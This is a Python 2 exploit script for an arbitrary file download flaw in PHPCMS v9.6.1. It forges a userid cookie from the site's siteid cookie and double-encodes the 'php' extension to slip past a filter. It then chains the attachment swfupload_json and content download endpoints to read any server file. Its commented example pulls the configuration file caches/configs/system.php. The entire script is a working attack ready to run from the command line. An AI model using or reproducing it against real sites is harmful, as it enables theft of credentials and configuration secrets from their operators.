import requests
import re
import sys

def get_cookie(url, **kwargs):
    conn = requests.get(url, **kwargs)
    return dict(conn.cookies)


def file_down(target, filename):
    first_path = "/index.php?m=wap&a=index&siteid=1"
    cookies = get_cookie(target + first_path, allow_redirects=False)
    matches = re.findall(r"=?(\w+_)siteid=?","=".join(cookies.keys()))

    if not matches :
        print('[*] not found cookie perfix')
        return False

    perfix = matches[0]

    siteid = cookies.get(perfix + "siteid", None)

    if not siteid :
        print('[*] not found siteid cookie')
        return False

    cookies[perfix+"_userid"] = siteid
    filename = filename.replace('php', 'p%25%32%35%25%33%33%25%36%33hp')
    path = "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26f%3d{filename}%26m%3d1%26modelid%3d1%26catid%3d1%26i%3d1%26d%3d1"
    path = path.replace("{filename}", filename)
    url = target + path
    att_json_cookie = get_cookie(url, cookies=cookies, allow_redirects=False)
    att_json = att_json_cookie.get(perfix + "att_json", None)

    if not att_json : 
        print('[*] not found att_json cookie')
        return False

    init_path = "/index.php?m=content&c=down&a_k={0}".format(att_json)
    init_url = target + init_path

    conn = requests.get(init_url)
    pattern = r"m=content&c=down&a=download&a_k=([^\"]+)"
    a_k = re.findall(pattern, conn.content)
    if not a_k:
        print('[*] not found a_k url')
        return False

    download_path = "/index.php?m=content&c=down&a=download&a_k={0}".format(a_k[0])
    download_url = target + download_path
    content =  requests.get(download_url).content
    print content

'''
target = "http://192.168.239.2:81/phpcms_9.6.1"
filename = "caches/configs/system.php"
file_down(target, filename)
'''

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print "python phpcmsv9_file_download.py target filename"
        sys.exit(0)

    target = sys.argv[1]
    if "://" not in target:
        target = "http://" + target

    filename = sys.argv[2]
    file_down(target, filename)
